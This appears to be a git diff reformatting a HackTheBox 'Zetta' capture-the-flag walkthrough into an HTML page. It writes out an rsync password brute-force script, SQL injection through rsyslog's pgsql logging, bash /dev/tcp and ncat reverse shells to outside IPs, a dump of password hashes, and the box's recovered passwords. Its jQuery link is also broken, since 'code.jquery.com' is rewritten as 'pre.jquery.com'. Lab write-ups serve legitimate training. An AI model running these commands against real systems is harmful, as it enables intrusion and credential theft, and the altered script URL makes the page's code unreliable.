@@ -28,37 +28,37 @@
                     </div>
                 </nav>
             </header>
-            <main>
+            <main class="mt-5">
+                <section class="header"> 
+                    <div class="container">
+                        <h6 class="subheader mb-0 pb-0">HackTheBox - Linux - Medium</h6>
+                        <h1 class="mt-0 pt-0 mb-4">Zetta</h1>
+                    </div>
+                </section>
                 <section class="user-part"> 
                     <div class="container">
                         <h2>USER</h2>
-                        <code>
-                            ~$ ifconfig tun0
-                            and grep ipv6 address (dead.beaf:::)
-
-                            to get IPv6 address (base on RFC2428):
-                            ~$ telnet 10.10.10.156 21
-                            user 3xplkP7OxFKotTiEHeNfc2EkrcwOtdQH
-                            pass 3xplkP7OxFKotTiEHeNfc2EkrcwOtdQH
-                            eprt |2|dead:beef::::1|1234|
-                            list
-                        </code>
+                        <pre>~$ ifconfig tun0</pre>
+                        <p>Run the above command to grep local (attacker's) ipv6 address which starts with <code>dead:beaf...</code></p>
+                        <p>Now to get Zetta's IPv6 address I used the technique described in RFC2428 which was mentioned on the website's homepage:</p>
+                        <pre>~$ telnet 10.10.10.156 21
+user 3xplkP7OxFKotTiEHeNfc2EkrcwOtdQH
+pass 3xplkP7OxFKotTiEHeNfc2EkrcwOtdQH
+eprt |2|dead:beef::::1|1234|
+list</pre>
                         <p>
                         I used <span class=code>tcpdump</span> to watch the traffic, then grab the IPv6 remote address.
-
-we can list rsync modules, which include /etc and we can download it except for some files.
-
-rsyncd.conf gives us complete module list which also includes password protected home_roy.
-
-to brute it is possible to use pexpect from python 
-```
-import pexpect
+                        </p>
+                        <p>
+                        I can list rsync modules, which include /etc and we can download it except for some files.
+                        rsyncd.conf gives us complete module list which also includes password protected home_roy.
+                        </p>
+                        <p>To brute it is possible to use pexpect from python.
+                        </p>
+                        <pre>import pexpect
 import sys
-
-
 with open("/usr/share/wordlists/rockyou.txt","r") as rockyou:
     passwds = list(rockyou.readlines())
-
 for passwd in passwds:
     passwd = passwd.strip()
     p = pexpect.spawn('bash -c "RSYNC_PASSWORD=\'%s\' rsync -avzp -6 rsync://roy@[dead:beef::250:56ff:feb9:a064]:8730/home_roy home/"' % (passwd))
@@ -68,38 +68,36 @@ for passwd in passwds:
     if not 'ERROR' in line:
         print("found it: " + passwd)
         break
-    p.close()
-```
-
-root@rascal:~/htb/boxes/Zetta# python exploit.py                                                                                                                          
+        p.close()</pre>
+                        <p>run the script</p>
+                        <pre>root@rascal:~/htb/boxes/Zetta# python exploit.py
 ...................................................................................found it: computer
+                        </pre>
+                    </div>
+                </section>
+                <section class="root-part">
+                    <div class="container">
+                        <h2>ROOT</h2>
 
-  </div>
-  </section>
-
-## ROOT
-
-
-~$ RSYNC_PASSWORD='computer' rsync -avzp zetta.pub -6 rsync://roy@[dead:beef::250:56ff:feb9:a064]:8730/home_roy/.ssh/authorized_keys
-
-~$ find / -newermt 2019-07-20
-to find several hidden .git repos
-
-
-roy@zetta:/etc/rsyslog.d$ git show
-commit e25cc20218f99abd68a2bf06ebfa81cd7367eb6a (HEAD -> master)
-Author: root <root@zetta.htb>
+                        <pre>~$ RSYNC_PASSWORD='computer' rsync -avzp zetta.pub -6 rsync://roy@[dead:beef::250:56ff:feb9:a064]:8730/home_roy/.ssh/authorized_keys</pre>
+                        <pre>~$ find / -newermt 2019-07-20</pre>
+                        <p>
+                        And I find several .git repos inside /etc
+                        </p>
+                        <pre class="mb-2">roy@zetta:/etc/rsyslog.d$ git show
+commit e25cc20218f99abd68a2bf06ebfa81cd7367eb6a (HEAD -&gt; master)
+Author: root &lt;root@zetta.htb&gt;
 Date:   Sat Jul 27 05:51:43 2019 -0400
 
-    Adding/adapting template from manual.
+Adding/adapting template from manual.
 
 diff --git a/pgsql.conf b/pgsql.conf
 index f31836d..9649f68 100644
 --- a/pgsql.conf
 +++ b/pgsql.conf
 @@ -1,5 +1,22 @@
- ### Configuration file for rsyslog-pgsql
- ### Changes are preserved
+### Configuration file for rsyslog-pgsql
+### Changes are preserved
 
 -module (load="ompgsql")
 -*.* action(type="ompgsql" server="localhost" db="Syslog" uid="rsyslog" pwd="")
@@ -121,47 +119,57 @@ index f31836d..9649f68 100644
 +module(load="ompgsql")
 +
 +# Only forward local7.info for testing.
-+local7.info action(type="ompgsql" server="localhost" user="postgres" pass="test1234" db="syslog" template="sql-syslog")
-
-
-and here is a way to execute this:
-roy@zetta:~$ logger -p local7.info "', now()); copy (select * from pg_catalog.pg_tables) to \$\$/var/tmp/hereyougo\$\$;-- '"; cat /var/log/postgresql/postgresql-11-main.log;ls /var/tmp
-
-postgres user's hash:
++local7.info action(type="ompgsql" server="localhost" user="postgres" pass="test1234" db="syslog" template="sql-syslog")</pre>
+                        <p>
+                        See the injection? Now let's execute it
+                        </p>
+                        <pre>
+roy@zetta:~$ logger -p local7.info "', now()); copy (select * from pg_catalog.pg_tables) to \$\$/var/tmp/hereyougo\$\$;-- '"
+cat /var/log/postgresql/postgresql-11-main.log;ls /var/tmp
+                        </pre>
+                        <p>
+                        postgres user's hash:
+                        <p>
+                        <pre>
 roy@zetta:/var/tmplogger -p local7.info "', now()); copy (SELECT usename, passwd FROM pg_shadow) to \$\$/var/tmp/hereyougo\$\$;-- '"
 roy@zetta:/var/tmp$ cat /var/tmp/hereyougo 
 postgres        md5743fa0a8feb9a1f8e54b404a98ac6355
-
-improve all this to get reverse shell (just wrapped all this to a file and run with bash):
-echo 'bash -c "bash -i &> /dev/tcp/10.10.14.82/4006 0>&1"' > /var/tmp/sh.sh
+                        </pre>
+                        <p>
+                        improve all this to get reverse shell (just wrapped all this to a file and run with bash):
+                        </p>
+                        <pre>
+echo 'bash -c "bash -i &amp;&gt; /dev/tcp/10.10.14.82/4006 0&gt;&amp;1"' &gt; /var/tmp/sh.sh
 logger -p local7.info "', now());create table t (id text); copy t from program \$\$bash /var/tmp/sh.sh\$\$;drop table t;-- '"
-
-after shell was landed i fetched id_rsa from .ssh of postgres user
-and logged in using normal ssh shell
-
+                        </pre>
+                        <p>
+                        after shell was landed i fetched id_rsa from .ssh of postgres user
+                        and logged in using normal ssh shell
+                        <p>
+                        <pre>
 postgres@zetta:~$ cat .psql_history
 CREATE DATABASE syslog;
 \c syslog
 CREATE TABLE syslog_lines ( ID serial not null primary key, CustomerID bigint, ReceivedAt timestamp without time zone NULL, DeviceReportedTime timestamp without time zone NULL, Facility smallint NULL, Priority smallint NULL, FromHost varchar(60) NULL, Message text, NTSeverity int NULL, Importance int NULL, EventSource varchar(60), EventUser varchar(60) NULL, EventCategory int NULL, EventID int NULL, EventBinaryData text NULL, MaxAvailable int NULL, CurrUsage int NULL, MinUsage int NULL, MaxUsage int NULL, InfoUnitID int NULL , SysLogTag varchar(60), EventLogType varchar(60), GenericFileName VarChar(60), SystemID int NULL);
 \d syslog_lines
 ALTER USER postgres WITH PASSWORD 'sup3rs3cur3p4ass@postgres';
+                        </pre>
+                        <p>
+                        file '/home/roy/.tudu.xml' said something about password scheme represented by '&lt;secret&gt;@userid'<br>
 
-file '/home/roy/.tudu.xml' said something about password scheme represented by '<secret>@userid'
-
-and it turned out that root password is 'sup3rs3cur3p4ass@root'
-
-..rooted!
+                        and it turned out that root password is 'sup3rs3cur3p4ass@root'<br>
+                        </p>
+                        ..<h2>rooted!</h2>
+                        </pre>
+                    </div>
+                </section>
             </main>
         </div>
-        <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" 
-            integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
+        <script src="https://pre.jquery.com/jquery-3.4.1.slim.min.js" 
+                integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
         <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" 
-            integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+                integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
         <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" 
-            integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+                integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
     </body>
 </html>
-
-
-PS.
-logger -p local7.info "pg_exec',\$\$2019-09-01 07:55:02\$\$); CREATE FUNCTION sys(cstring) RETURNS int AS $\$/tmp/pg_exec.so$\$, $\$pg_exec$\$ LANGUAGE $\$c$\$ STRICT; -- " logger -p local7.info "pg_exec',\$\$2019-09-01 07:55:02\$\$); select sys($\$/tmp/ncat -e /bin/sh 10.10.14.28 8888$\$); -- " 
